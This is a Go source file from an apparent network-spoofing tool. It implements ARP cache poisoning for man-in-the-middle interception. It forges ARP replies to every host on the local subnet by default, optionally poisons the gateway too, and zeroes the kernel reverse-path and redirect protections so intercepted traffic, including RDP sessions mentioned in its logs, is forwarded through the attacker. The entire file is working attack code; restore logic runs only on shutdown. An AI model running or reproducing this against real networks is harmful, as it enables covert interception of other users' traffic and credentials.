package netspoof

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// RunARP performs ARP spoofing from the shared Lan table.
// It blocks until ctx is cancelled, then restores everything it changed.
func RunARP(ctx context.Context, sess *Session) error {
	if !sess.GatewayIPv4.IsValid() {
		return fmt.Errorf("no gateway IPv4")
	}

	// Gateway MAC is mandatory. Poll `ip neigh` directly so we don't depend
	// on the discovery goroutine's scheduling.
	gwMAC, ok := sess.Lan.Get(sess.GatewayIPv4)
	if !ok {
		refreshNeigh(sess)
		gwMAC, ok = sess.Lan.Get(sess.GatewayIPv4)
	}
	if !ok {
		// one directed ARP probe, then poll every 100ms for 2s
		raw := buildARPRequest(sess.IfaceMAC, sess.OurIPv4, sess.GatewayIPv4)
		if raw != nil {
			_ = sess.Tx.Send(raw)
		}
		deadline := time.Now().Add(2 * time.Second)
		for time.Now().Before(deadline) {
			refreshNeigh(sess)
			if mac, found := sess.Lan.Get(sess.GatewayIPv4); found {
				gwMAC = mac
				ok = true
				break
			}
			time.Sleep(100 * time.Millisecond)
		}
	}
	if !ok {
		return fmt.Errorf("cannot resolve gateway MAC for %s; check -iface / -gateway", sess.GatewayIPv4)
	}
	sess.GatewayMAC = gwMAC
	sess.prevIPForward = readIPForward()
	fmt.Printf("[arp] ip_forward was %q, enabling\n", sess.prevIPForward)
	writeIPForward("1")

	// Save + disable all sysctls that block forwarding during MITM.
	// This includes rp_filter (strict reverse-path filtering) and
	// send_redirects (the kernel telling the victim to route differently),
	// plus accept_redirects so our own stack doesn't get rerouted mid-flight.
	applyForwardingSysctls(sess)

	defer func() {
		fmt.Println("[arp] restoring IPv4 forwarding sysctls")
		restoreForwardingSysctls(sess)
		if sess.prevIPForward != "" {
			writeIPForward(sess.prevIPForward)
		}
	}()

	// Verify it actually took effect. sysctl can silently fail; read back.
	ok2 := false
	for i := 0; i < 20; i++ {
		if readIPForward() == "1" {
			ok2 = true
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if !ok2 {
		return fmt.Errorf("failed to enable ip_forward (still %q)", readIPForward())
	}
	fmt.Println("[arp] ip_forward enabled")
	logForwardingDiagnostics(sess)
	// Restore on exit — mandatory
	defer func() {
		fmt.Println("[arp] shutting down, restoring ARP state")
		restoreARP(sess)
	}()
	tgtDesc := "dynamic (live Lan table)"
	if len(sess.Targets) > 0 {
		tgtDesc = fmt.Sprintf("%d explicit", len(sess.Targets))
	}
	fmt.Printf("[arp] started: targets=%s spoofed=%v fullduplex=%v\n",
		tgtDesc, sess.Spoofed, sess.FullDuplex)
	fmt.Printf("[arp] gateway %s = %s\n", sess.GatewayIPv4, gwMAC)

	tick := time.NewTicker(1 * time.Second)
	defer tick.Stop()

	// spam once immediately, then every tick
	spoofOnce(sess)

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-tick.C:
			spoofOnce(sess)
		}
	}
}
func spoofOnce(sess *Session) {
	snap := sess.Lan.Snapshot()
	targets := selectTargets(sess, snap)

	for _, target := range targets {
		tMAC, ok := snap[target]
		if !ok {
			continue
		}
		for _, spoofIP := range sess.Spoofed {
			if spoofIP == target {
				continue
			}
			raw := buildARPReply(sess.IfaceMAC, spoofIP, tMAC, target)
			if raw != nil {
				_ = sess.Tx.Send(raw)
			}
		}

		if sess.FullDuplex {
			// tell gateway: <target> is at our MAC
			raw := buildARPReply(sess.IfaceMAC, target, sess.GatewayMAC, sess.GatewayIPv4)
			if raw != nil {
				_ = sess.Tx.Send(raw)
			}
		}
	}
}

// selectTargets returns the set of IPs we send spoofed ARP replies to.
// If sess.Targets is non-nil, that's the explicit list. Otherwise, we take
// every host currently in the Lan table that lies on our subnet, excluding
// ourselves and the gateway.
func selectTargets(sess *Session, snap map[netip.Addr]net.HardwareAddr) []netip.Addr {
	if len(sess.Targets) > 0 {
		return sess.Targets
	}
	ourIP := sess.OurIPv4
	gwIP := sess.GatewayIPv4
	mask := sess.OurIPv4Net.Mask
	if len(mask) == 16 {
		mask = mask[12:]
	}

	var out []netip.Addr
	for ip := range snap {
		if !ip.Is4() {
			continue
		}
		if ip == ourIP || ip == gwIP {
			continue
		}
		if !ipInNet(ip, mask, ourIP) {
			continue
		}
		out = append(out, ip)
	}
	return out
}

func ipInNet(ip netip.Addr, mask net.IPMask, our netip.Addr) bool {
	a := ip.As4()
	o := our.As4()
	return a[0]&mask[0] == o[0]&mask[0] &&
		a[1]&mask[1] == o[1]&mask[1] &&
		a[2]&mask[2] == o[2]&mask[2] &&
		a[3]&mask[3] == o[3]&mask[3]
}

func restoreARP(sess *Session) {
	snap := sess.Lan.Snapshot()
	targets := selectTargets(sess, snap)

	// Put the *real* gateway MAC back into every target's cache.
	gwMAC, ok := snap[sess.GatewayIPv4]
	if ok {
		for _, target := range targets {
			tMAC, ok := snap[target]
			if !ok {
				continue
			}
			for _, spoofIP := range sess.Spoofed {
				if spoofIP == target {
					continue
				}
				raw := buildARPReply(gwMAC, spoofIP, tMAC, target)
				if raw != nil {
					_ = sess.Tx.Send(raw)
				}
			}
		}
	}

	// If we told the gateway lies, correct them.
	if sess.FullDuplex {
		for _, target := range targets {
			tMAC, ok := snap[target]
			if !ok {
				continue
			}
			raw := buildARPReply(tMAC, target, sess.GatewayMAC, sess.GatewayIPv4)
			if raw != nil {
				_ = sess.Tx.Send(raw)
			}
		}
	}

	// Gratuitous ARP: announce the real gateway to the whole LAN.
	if gwMAC != nil {
		bc := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
		raw := buildARPReply(gwMAC, sess.GatewayIPv4, bc, sess.GatewayIPv4)
		if raw != nil {
			_ = sess.Tx.Send(raw)
		}
	}

	time.Sleep(250 * time.Millisecond)
}

// --- packet builders ---

func buildARPReply(srcMAC net.HardwareAddr, srcIP netip.Addr, dstMAC net.HardwareAddr, dstIP netip.Addr) []byte {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.AsSlice(),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP.AsSlice(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return nil
	}
	return buf.Bytes()
}

// --- sysctl helpers ---

func readIPForward() string {
	data, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward")
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func writeIPForward(val string) {
	_ = exec.Command("sysctl", "-w", "net.ipv4.ip_forward="+val).Run()
}

// forwardingSysctlKeys are the /proc/sys/net/ipv4/conf/<scope>/<key> entries
// we save, zero, and restore while ARP spoofing.
var forwardingSysctlKeys = []string{
	"rp_filter",
	"send_redirects",
	"accept_redirects",
	"accept_source_route",
}

// forwardingSysctlScopes are the scopes ("all", "default", interface) we touch.
func forwardingSysctlScopes(sess *Session) []string {
	scopes := []string{"all", "default"}
	if sess.IfaceName != "" {
		scopes = append(scopes, sess.IfaceName)
	}
	return scopes
}

// applyForwardingSysctls saves the current value of each relevant sysctl,
// then sets each to 0. This is what makes kernel forwarding actually work
// during ARP spoofing on Linux.
func applyForwardingSysctls(sess *Session) {
	if sess.prevSysctls == nil {
		sess.prevSysctls = make(map[string]string)
	}
	changed := 0
	for _, scope := range forwardingSysctlScopes(sess) {
		for _, key := range forwardingSysctlKeys {
			prev := readSysctlIPv4(scope, key)
			if prev == "" {
				continue // file doesn't exist on this kernel
			}
			path := scope + "/" + key
			sess.prevSysctls[path] = prev
			if prev != "0" {
				writeSysctlIPv4(scope, key, "0")
				changed++
			}
		}
	}
	fmt.Printf("[arp] forwarding sysctls: saved %d, zeroed %d\n", len(sess.prevSysctls), changed)
}

// restoreForwardingSysctls puts every saved sysctl back to its previous value.
func restoreForwardingSysctls(sess *Session) {
	for path, val := range sess.prevSysctls {
		if val == "" {
			continue
		}
		parts := strings.SplitN(path, "/", 2)
		if len(parts) != 2 {
			continue
		}
		writeSysctlIPv4(parts[0], parts[1], val)
	}
	sess.prevSysctls = nil
}

func readSysctlIPv4(scope, key string) string {
	data, err := os.ReadFile("/proc/sys/net/ipv4/conf/" + scope + "/" + key)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

func writeSysctlIPv4(scope, key, val string) {
	_ = exec.Command("sysctl", "-w", "net.ipv4.conf."+scope+"."+key+"="+val).Run()
}

func logForwardingDiagnostics(sess *Session) {
	if out, err := exec.Command("sh", "-c", "iptables -S FORWARD 2>/dev/null | head -20").CombinedOutput(); err == nil && len(out) > 0 {
		fmt.Printf("[arp] iptables FORWARD snapshot:\n%s", string(out))
		if bytes.Contains(out, []byte("-P FORWARD DROP")) {
			fmt.Printf("[arp] warning: FORWARD policy is DROP; forwarded RDP/TCP packets may die unless a FORWARD allow rule exists for %s\n", sess.IfaceName)
		}
	}
	if out, err := exec.Command("sh", "-c", "nft list ruleset 2>/dev/null | grep -i 'hook forward\\|policy drop' | head -20").CombinedOutput(); err == nil && len(out) > 0 {
		fmt.Printf("[arp] nft forward/policy snapshot:\n%s", string(out))
		if bytes.Contains(bytes.ToLower(out), []byte("policy drop")) {
			fmt.Printf("[arp] warning: nftables has a drop policy in the ruleset; forwarded RDP/TCP packets may be blocked\n")
		}
	}
	if out, err := exec.Command("ip", "route", "get", sess.GatewayIPv4.String()).CombinedOutput(); err == nil && len(out) > 0 {
		fmt.Printf("[arp] route to gateway: %s", string(out))
	}
}

// silence unused import warning for strconv/bytes; they may be used later
var _ = strconv.Itoa
